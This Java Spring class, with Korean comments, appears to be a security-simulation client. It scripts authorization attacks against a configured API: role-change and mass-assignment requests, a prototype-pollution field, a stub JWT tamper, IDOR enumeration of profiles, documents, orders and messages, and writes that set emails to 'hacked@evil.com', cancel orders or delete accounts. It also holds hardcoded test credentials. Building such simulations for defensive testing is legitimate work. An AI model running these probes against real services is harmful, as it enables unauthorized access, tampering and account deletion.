package io.contexa.contexacore.simulation.client;

import lombok.RequiredArgsConstructor;
import lombok.extern.slf4j.Slf4j;
import org.springframework.beans.factory.annotation.Value;
import org.springframework.http.HttpMethod;
import org.springframework.http.HttpStatus;
import org.springframework.http.ResponseEntity;
import org.springframework.stereotype.Component;

import java.util.*;
import java.util.concurrent.ThreadLocalRandom;
import java.util.concurrent.atomic.AtomicInteger;

/**
 * 인가 위반 공격 시뮬레이션 클라이언트
 * 
 * 권한 상승, 무단 접근, IDOR, 역할 변경 등 인가 관련 공격을 시뮬레이션합니다.
 * 
 * @author AI3Security
 * @since 1.0.0
 */
@Slf4j
@Component
@RequiredArgsConstructor
public class AuthorizationViolationClient {
    
    private final SimulationClient simulationClient;
    private final LoginAttackClient loginAttackClient;
    
    @Value("${simulation.attack.authorization.delay-ms:200}")
    private int attackDelayMs;
    
    // 테스트용 사용자 계정
    private static final Map<String, UserRole> TEST_USERS = new HashMap<>();
    static {
        TEST_USERS.put("user001", new UserRole("user001", "User@123", "USER"));
        TEST_USERS.put("manager001", new UserRole("manager001", "Manager@123", "MANAGER"));
        TEST_USERS.put("admin001", new UserRole("admin001", "Admin@123", "ADMIN"));
        TEST_USERS.put("guest001", new UserRole("guest001", "Guest@123", "GUEST"));
        TEST_USERS.put("viewer001", new UserRole("viewer001", "Viewer@123", "VIEWER"));
    }
    
    // 보호된 리소스 엔드포인트
    private static final List<ProtectedResource> PROTECTED_RESOURCES = Arrays.asList(
        // Admin only
        new ProtectedResource("/api/admin/users", "ADMIN", "User Management"),
        new ProtectedResource("/api/admin/settings", "ADMIN", "System Settings"),
        new ProtectedResource("/api/admin/logs", "ADMIN", "Audit Logs"),
        new ProtectedResource("/api/admin/backup", "ADMIN", "System Backup"),
        
        // Manager level
        new ProtectedResource("/api/reports/financial", "MANAGER", "Financial Reports"),
        new ProtectedResource("/api/reports/analytics", "MANAGER", "Analytics Dashboard"),
        new ProtectedResource("/api/team/members", "MANAGER", "Team Management"),
        
        // User level
        new ProtectedResource("/api/user/profile", "USER", "User Profile"),
        new ProtectedResource("/api/user/documents", "USER", "Personal Documents"),
        new ProtectedResource("/api/user/settings", "USER", "User Settings"),
        
        // Specific user resources (IDOR targets)
        new ProtectedResource("/api/users/{userId}/profile", "OWNER", "Other User Profile"),
        new ProtectedResource("/api/documents/{docId}", "OWNER", "Specific Document"),
        new ProtectedResource("/api/orders/{orderId}", "OWNER", "Specific Order"),
        new ProtectedResource("/api/messages/{messageId}", "OWNER", "Private Message")
    );
    
    /**
     * 권한 상승 공격 시뮬레이션
     */
    public AttackResult privilegeEscalationAttack() {
        log.warn("=== 권한 상승 공격 시작 ===");
        AttackResult result = new AttackResult("Privilege Escalation Attack");
        
        try {
            // 일반 사용자로 로그인
            UserRole normalUser = TEST_USERS.get("user001");
            log.info("일반 사용자로 로그인: {}", normalUser.username);
            ResponseEntity<String> loginResponse = simulationClient.loginJson(
                normalUser.username, normalUser.password);
            
            if (loginResponse.getStatusCode() != HttpStatus.OK) {
                log.error("로그인 실패");
                result.addError("Login failed");
                return result;
            }
            
            // 1. 직접 권한 변경 시도
            log.info("1. 직접 권한 변경 시도");
            ResponseEntity<String> roleChangeResponse = simulationClient.post(
                "/api/user/role",
                Map.of("role", "ADMIN"),
                null
            );
            result.addAttempt("Direct Role Change to ADMIN", 
                roleChangeResponse.getStatusCode() == HttpStatus.OK, roleChangeResponse);
            
            // 2. 프로필 수정을 통한 권한 상승
            log.info("2. 프로필 수정을 통한 권한 상승 시도");
            ResponseEntity<String> profileUpdateResponse = simulationClient.put(
                "/api/user/profile",
                Map.of(
                    "name", normalUser.username,
                    "email", normalUser.username + "@example.com",
                    "role", "ADMIN",  // 숨겨진 필드 추가
                    "isAdmin", true,   // 또 다른 시도
                    "privileges", Arrays.asList("ADMIN", "SUPER_USER")
                ),
                null
            );
            result.addAttempt("Profile Update with Hidden Fields", 
                profileUpdateResponse.getStatusCode() == HttpStatus.OK, profileUpdateResponse);
            
            // 3. JWT 토큰 조작
            log.info("3. JWT 토큰 조작 시도");
            String currentToken = simulationClient.getCurrentAuthToken();
            if (currentToken != null) {
                // 토큰의 payload 부분을 조작 (실제로는 더 복잡한 조작이 필요)
                String manipulatedToken = manipulateJwtToken(currentToken);
                ResponseEntity<String> tokenResponse = simulationClient.requestWithManipulatedToken(
                    "/api/admin/users", manipulatedToken);
                result.addAttempt("Manipulated JWT Token", 
                    tokenResponse.getStatusCode() == HttpStatus.OK, tokenResponse);
            }
            
            // 4. 관리자 엔드포인트 직접 접근
            log.info("4. 관리자 엔드포인트 직접 접근 시도");
            for (ProtectedResource resource : PROTECTED_RESOURCES) {
                if ("ADMIN".equals(resource.requiredRole)) {
                    ResponseEntity<String> adminResponse = simulationClient.get(
                        resource.endpoint, null, null);
                    boolean success = adminResponse.getStatusCode() == HttpStatus.OK;
                    result.addAttempt("Admin Endpoint: " + resource.description, 
                        success, adminResponse);
                    
                    if (success) {
                        log.error("!!! 권한 상승 성공: {}", resource.endpoint);
                        result.setSuccessful(true);
                    }
                    
                    Thread.sleep(attackDelayMs);
                }
            }
            
            // 5. Mass Assignment 취약점 악용
            log.info("5. Mass Assignment 취약점 악용");
            ResponseEntity<String> massAssignmentResponse = simulationClient.post(
                "/api/user/update",
                Map.of(
                    "id", normalUser.username,
                    "role", "ADMIN",
                    "permissions", Arrays.asList("READ_ALL", "WRITE_ALL", "DELETE_ALL"),
                    "__proto__.isAdmin", true  // Prototype pollution 시도
                ),
                null
            );
            result.addAttempt("Mass Assignment Vulnerability", 
                massAssignmentResponse.getStatusCode() == HttpStatus.OK, massAssignmentResponse);
            
        } catch (Exception e) {
            log.error("권한 상승 공격 실패: {}", e.getMessage());
            result.addError(e.getMessage());
        }
        
        log.warn("=== 권한 상승 공격 종료: 성공={} ===", result.isSuccessful());
        return result;
    }
    
    /**
     * IDOR (Insecure Direct Object Reference) 공격
     */
    public AttackResult idorAttack() {
        log.warn("=== IDOR 공격 시작 ===");
        AttackResult result = new AttackResult("IDOR Attack");
        
        try {
            // 일반 사용자로 로그인
            UserRole user = TEST_USERS.get("user001");
            log.info("사용자 로그인: {}", user.username);
            simulationClient.loginJson(user.username, user.password);
            
            // 1. 다른 사용자 프로필 접근
            log.info("1. 다른 사용자 프로필 접근 시도");
            List<String> userIds = Arrays.asList("1", "2", "100", "999", "admin", "root");
            for (String userId : userIds) {
                String endpoint = "/api/users/" + userId + "/profile";
                ResponseEntity<String> response = simulationClient.get(endpoint, null, null);
                boolean success = response.getStatusCode() == HttpStatus.OK;
                result.addAttempt("User Profile: " + userId, success, response);
                
                if (success) {
                    log.error("!!! IDOR 성공: 사용자 {} 프로필 접근", userId);
                    result.setSuccessful(true);
                    
                    // 프로필 수정 시도
                    simulationClient.put(
                        endpoint,
                        Map.of("email", "hacked@evil.com"),
                        null
                    );
                }
                
                Thread.sleep(attackDelayMs);
            }
            
            // 2. 문서 ID 추측을 통한 접근
            log.info("2. 문서 ID 추측을 통한 접근");
            for (int docId = 1; docId <= 10; docId++) {
                String endpoint = "/api/documents/" + docId;
                ResponseEntity<String> response = simulationClient.get(endpoint, null, null);
                boolean success = response.getStatusCode() == HttpStatus.OK;
                result.addAttempt("Document ID: " + docId, success, response);
                
                if (success) {
                    log.error("!!! IDOR 성공: 문서 {} 접근", docId);
                    result.setSuccessful(true);
                    
                    // 문서 다운로드 시도
                    simulationClient.get(endpoint + "/download", null, null);
                }
                
                Thread.sleep(attackDelayMs);
            }
            
            // 3. UUID 추측 공격
            log.info("3. UUID 패턴 추측 공격");
            List<String> uuids = Arrays.asList(
                "00000000-0000-0000-0000-000000000001",
                "11111111-1111-1111-1111-111111111111",
                "12345678-1234-1234-1234-123456789012"
            );
            for (String uuid : uuids) {
                String endpoint = "/api/resources/" + uuid;
                ResponseEntity<String> response = simulationClient.get(endpoint, null, null);
                result.addAttempt("Resource UUID: " + uuid, 
                    response.getStatusCode() == HttpStatus.OK, response);
                Thread.sleep(attackDelayMs);
            }
            
            // 4. 주문 정보 접근
            log.info("4. 다른 사용자 주문 정보 접근");
            for (int orderId = 1000; orderId <= 1010; orderId++) {
                String endpoint = "/api/orders/" + orderId;
                ResponseEntity<String> response = simulationClient.get(endpoint, null, null);
                boolean success = response.getStatusCode() == HttpStatus.OK;
                result.addAttempt("Order ID: " + orderId, success, response);
                
                if (success) {
                    log.error("!!! IDOR 성공: 주문 {} 접근", orderId);
                    result.setSuccessful(true);
                    
                    // 주문 취소 시도
                    simulationClient.post(endpoint + "/cancel", null, null);
                }
                
                Thread.sleep(attackDelayMs);
            }
            
            // 5. 메시지/채팅 접근
            log.info("5. 비공개 메시지 접근 시도");
            for (int messageId = 1; messageId <= 5; messageId++) {
                String endpoint = "/api/messages/" + messageId;
                ResponseEntity<String> response = simulationClient.get(endpoint, null, null);
                result.addAttempt("Message ID: " + messageId, 
                    response.getStatusCode() == HttpStatus.OK, response);
                Thread.sleep(attackDelayMs);
            }
            
        } catch (Exception e) {
            log.error("IDOR 공격 실패: {}", e.getMessage());
            result.addError(e.getMessage());
        }
        
        log.warn("=== IDOR 공격 종료: 성공={} ===", result.isSuccessful());
        return result;
    }
    
    /**
     * 수평적 권한 상승 (Horizontal Privilege Escalation)
     */
    public AttackResult horizontalPrivilegeEscalation() {
        log.warn("=== 수평적 권한 상승 공격 시작 ===");
        AttackResult result = new AttackResult("Horizontal Privilege Escalation");
        
        try {
            // user001로 로그인
            UserRole user1 = TEST_USERS.get("user001");
            log.info("User1 로그인: {}", user1.username);
            simulationClient.loginJson(user1.username, user1.password);
            String user1Token = simulationClient.getCurrentAuthToken();
            
            // user001로 다른 사용자 리소스 접근 시도
            log.info("다른 사용자(viewer001)의 리소스 접근 시도");
            
            // 1. 다른 사용자 프로필 수정
            ResponseEntity<String> profileResponse = simulationClient.put(
                "/api/users/viewer001/profile",
                Map.of("email", "hacked@evil.com"),
                null
            );
            result.addAttempt("Modify Other User Profile", 
                profileResponse.getStatusCode() == HttpStatus.OK, profileResponse);
            
            // 2. 다른 사용자 설정 변경
            ResponseEntity<String> settingsResponse = simulationClient.post(
                "/api/users/viewer001/settings",
                Map.of("notifications", false, "privacy", "public"),
                null
            );
            result.addAttempt("Change Other User Settings", 
                settingsResponse.getStatusCode() == HttpStatus.OK, settingsResponse);
            
            // 3. 다른 사용자 대신 액션 수행
            ResponseEntity<String> actionResponse = simulationClient.post(
                "/api/actions/perform",
                Map.of("userId", "viewer001", "action", "DELETE_ACCOUNT"),
                null
            );
            result.addAttempt("Perform Action as Other User", 
                actionResponse.getStatusCode() == HttpStatus.OK, actionResponse);
            
            // 4. 세션 공유를 통한 접근
            log.info("세션 공유를 통한 접근 시도");
            simulationClient.clearSession();
            
            // viewer001로 로그인
            UserRole user2 = TEST_USERS.get("viewer001");
            simulationClient.loginJson(user2.username, user2.password);
            
            // user1의 토큰으로 user2 리소스 접근
            if (user1Token != null) {
                ResponseEntity<String> crossTokenResponse = simulationClient.requestWithManipulatedToken(
                    "/api/user/current", user1Token);
                result.addAttempt("Cross-Token Access", 
                    crossTokenResponse.getStatusCode() == HttpStatus.OK, crossTokenResponse);
            }
            
        } catch (Exception e) {
            log.error("수평적 권한 상승 실패: {}", e.getMessage());
            result.addError(e.getMessage());
        }
        
        log.warn("=== 수평적 권한 상승 공격 종료: 성공={} ===", result.isSuccessful());
        return result;
    }
    
    /**
     * API 권한 우회 공격
     */
    public AttackResult apiAuthorizationBypass() {
        log.warn("=== API 권한 우회 공격 시작 ===");
        AttackResult result = new AttackResult("API Authorization Bypass");
        
        try {
            // Guest 사용자로 로그인 (최소 권한)
            UserRole guest = TEST_USERS.get("guest001");
            log.info("Guest 로그인: {}", guest.username);
            simulationClient.loginJson(guest.username, guest.password);
            
            // 1. HTTP Method 변경을 통한 우회
            log.info("1. HTTP Method 변경 우회");
            String endpoint = "/api/admin/users";
            
            // GET이 막혀있다면 다른 메서드 시도
            Map<HttpMethod, String> methods = new LinkedHashMap<>();
            methods.put(HttpMethod.GET, "GET Request");
            methods.put(HttpMethod.POST, "POST Request");
            methods.put(HttpMethod.PUT, "PUT Request");
            methods.put(HttpMethod.PATCH, "PATCH Request");
            methods.put(HttpMethod.DELETE, "DELETE Request");
            methods.put(HttpMethod.HEAD, "HEAD Request");
            methods.put(HttpMethod.OPTIONS, "OPTIONS Request");
            
            for (Map.Entry<HttpMethod, String> entry : methods.entrySet()) {
                ResponseEntity<String> response = executeMethodRequest(
                    endpoint, entry.getKey());
                boolean success = response != null && response.getStatusCode() == HttpStatus.OK;
                result.addAttempt("Method Override: " + entry.getValue(), success, response);
                
                if (success) {
                    log.error("!!! Method Override 성공: {}", entry.getKey());
                    result.setSuccessful(true);
                }
                Thread.sleep(attackDelayMs);
            }
            
            // 2. Content-Type 조작
            log.info("2. Content-Type 조작");
            Map<String, String> contentTypes = new HashMap<>();
            contentTypes.put("Content-Type", "application/xml");
            contentTypes.put("Content-Type", "text/plain");
            contentTypes.put("Content-Type", "application/x-www-form-urlencoded");
            
            ResponseEntity<String> contentTypeResponse = simulationClient.get(
                "/api/admin/settings", null, contentTypes);
            result.addAttempt("Content-Type Manipulation", 
                contentTypeResponse.getStatusCode() == HttpStatus.OK, contentTypeResponse);
            
            // 3. API 버전 다운그레이드
            log.info("3. API 버전 다운그레이드");
            List<String> apiVersions = Arrays.asList(
                "/api/v1/admin/users",
                "/api/v0/admin/users",
                "/v1/admin/users",
                "/legacy/api/admin/users"
            );
            
            for (String versionEndpoint : apiVersions) {
                ResponseEntity<String> response = simulationClient.get(
                    versionEndpoint, null, null);
                result.addAttempt("API Version: " + versionEndpoint, 
                    response.getStatusCode() == HttpStatus.OK, response);
                Thread.sleep(attackDelayMs);
            }
            
            // 4. 파라미터 오염 (Parameter Pollution)
            log.info("4. 파라미터 오염 공격");
            Map<String, String> pollutedParams = new HashMap<>();
            pollutedParams.put("role", "guest");
            pollutedParams.put("role", "admin"); // 중복 파라미터
            
            ResponseEntity<String> pollutionResponse = simulationClient.get(
                "/api/user/info", pollutedParams, null);
            result.addAttempt("Parameter Pollution", 
                pollutionResponse.getStatusCode() == HttpStatus.OK, pollutionResponse);
            
            // 5. GraphQL 권한 우회 (if applicable)
            log.info("5. GraphQL Introspection 시도");
            String graphqlQuery = "{ __schema { types { name } } }";
            ResponseEntity<String> graphqlResponse = simulationClient.post(
                "/graphql",
                Map.of("query", graphqlQuery),
                null
            );
            result.addAttempt("GraphQL Introspection", 
                graphqlResponse.getStatusCode() == HttpStatus.OK, graphqlResponse);
            
        } catch (Exception e) {
            log.error("API 권한 우회 실패: {}", e.getMessage());
            result.addError(e.getMessage());
        }
        
        log.warn("=== API 권한 우회 공격 종료: 성공={} ===", result.isSuccessful());
        return result;
    }
    
    /**
     * 역할 체인 공격 (Role Chain Attack)
     */
    public AttackResult roleChainAttack() {
        log.warn("=== 역할 체인 공격 시작 ===");
        AttackResult result = new AttackResult("Role Chain Attack");
        
        try {
            // 단계별 권한 상승 시도
            log.info("단계별 권한 상승 시도");
            
            // 1단계: Guest → User
            UserRole guest = TEST_USERS.get("guest001");
            simulationClient.loginJson(guest.username, guest.password);
            
            ResponseEntity<String> step1Response = simulationClient.post(
                "/api/user/upgrade",
                Map.of("requestedRole", "USER"),
                null
            );
            result.addAttempt("Guest to User Upgrade", 
                step1Response.getStatusCode() == HttpStatus.OK, step1Response);
            
            // 2단계: User → Manager
            if (step1Response.getStatusCode() == HttpStatus.OK) {
                Thread.sleep(1000);
                ResponseEntity<String> step2Response = simulationClient.post(
                    "/api/user/upgrade",
                    Map.of("requestedRole", "MANAGER"),
                    null
                );
                result.addAttempt("User to Manager Upgrade", 
                    step2Response.getStatusCode() == HttpStatus.OK, step2Response);
                
                // 3단계: Manager → Admin
                if (step2Response.getStatusCode() == HttpStatus.OK) {
                    Thread.sleep(1000);
                    ResponseEntity<String> step3Response = simulationClient.post(
                        "/api/user/upgrade",
                        Map.of("requestedRole", "ADMIN"),
                        null
                    );
                    result.addAttempt("Manager to Admin Upgrade", 
                        step3Response.getStatusCode() == HttpStatus.OK, step3Response);
                    
                    if (step3Response.getStatusCode() == HttpStatus.OK) {
                        log.error("!!! 역할 체인 공격 성공: Guest → Admin");
                        result.setSuccessful(true);
                    }
                }
            }
            
            // 대안: 역할 조합 공격
            log.info("역할 조합 공격 시도");
            ResponseEntity<String> multiRoleResponse = simulationClient.post(
                "/api/user/roles",
                Map.of("roles", Arrays.asList("USER", "MANAGER", "ADMIN")),
                null
            );
            result.addAttempt("Multiple Roles Assignment", 
                multiRoleResponse.getStatusCode() == HttpStatus.OK, multiRoleResponse);
            
        } catch (Exception e) {
            log.error("역할 체인 공격 실패: {}", e.getMessage());
            result.addError(e.getMessage());
        }
        
        log.warn("=== 역할 체인 공격 종료: 성공={} ===", result.isSuccessful());
        return result;
    }
    
    // === Helper Methods ===
    
    private String manipulateJwtToken(String originalToken) {
        // 실제 JWT 조작 로직 (간단한 시뮬레이션)
        // 실제로는 JWT의 payload를 디코딩하고 role을 변경한 후 다시 인코딩
        if (originalToken.contains(".")) {
            String[] parts = originalToken.split("\\.");
            if (parts.length == 3) {
                // Payload 부분을 조작 (실제로는 Base64 디코딩/인코딩 필요)
                return parts[0] + ".MANIPULATED_PAYLOAD." + parts[2];
            }
        }
        return originalToken + "_MANIPULATED";
    }
    
    private ResponseEntity<String> executeMethodRequest(String endpoint, HttpMethod method) {
        try {
            if (method == HttpMethod.GET) {
                return simulationClient.get(endpoint, null, null);
            } else if (method == HttpMethod.POST) {
                return simulationClient.post(endpoint, null, null);
            } else if (method == HttpMethod.PUT) {
                return simulationClient.put(endpoint, null, null);
            } else if (method == HttpMethod.DELETE) {
                return simulationClient.delete(endpoint, null);
            } else {
                    // For other methods, use RestTemplate directly
                    return simulationClient.get(endpoint, null, 
                        Map.of("X-HTTP-Method-Override", method.name()));
            }
        } catch (Exception e) {
            log.debug("Method {} failed: {}", method, e.getMessage());
            return ResponseEntity.status(HttpStatus.FORBIDDEN).body("Error");
        }
    }
    
    // === Inner Classes ===
    
    /**
     * 사용자 역할 정보
     */
    private static class UserRole {
        final String username;
        final String password;
        final String role;
        
        UserRole(String username, String password, String role) {
            this.username = username;
            this.password = password;
            this.role = role;
        }
    }
    
    /**
     * 보호된 리소스 정보
     */
    private static class ProtectedResource {
        final String endpoint;
        final String requiredRole;
        final String description;
        
        ProtectedResource(String endpoint, String requiredRole, String description) {
            this.endpoint = endpoint;
            this.requiredRole = requiredRole;
            this.description = description;
        }
    }
    
    /**
     * 공격 결과 클래스
     */
    public static class AttackResult {
        private final String attackType;
        private final List<AttemptRecord> attempts = new ArrayList<>();
        private final List<String> errors = new ArrayList<>();
        private boolean successful = false;
        private long startTime = System.currentTimeMillis();
        private long endTime;
        
        public AttackResult(String attackType) {
            this.attackType = attackType;
        }
        
        public void addAttempt(String action, boolean success, ResponseEntity<?> response) {
            attempts.add(new AttemptRecord(action, success, 
                response != null ? HttpStatus.valueOf(response.getStatusCode().value()) : HttpStatus.INTERNAL_SERVER_ERROR));
            if (success) successful = true;
        }
        
        public void addError(String error) {
            errors.add(error);
        }
        
        public void complete() {
            endTime = System.currentTimeMillis();
        }
        
        // Getters
        public String getAttackType() { return attackType; }
        public List<AttemptRecord> getAttempts() { return attempts; }
        public List<String> getErrors() { return errors; }
        public boolean isSuccessful() { return successful; }
        public void setSuccessful(boolean successful) { this.successful = successful; }
        public long getDuration() { 
            return (endTime > 0 ? endTime : System.currentTimeMillis()) - startTime; 
        }
        
        /**
         * 시도 기록
         */
        public static class AttemptRecord {
            private final String action;
            private final boolean success;
            private final HttpStatus httpStatus;
            private final long timestamp = System.currentTimeMillis();
            
            public AttemptRecord(String action, boolean success, HttpStatus httpStatus) {
                this.action = action;
                this.success = success;
                this.httpStatus = httpStatus;
            }
            
            // Getters
            public String getAction() { return action; }
            public boolean isSuccess() { return success; }
            public HttpStatus getHttpStatus() { return httpStatus; }
            public long getTimestamp() { return timestamp; }
        }
    }
}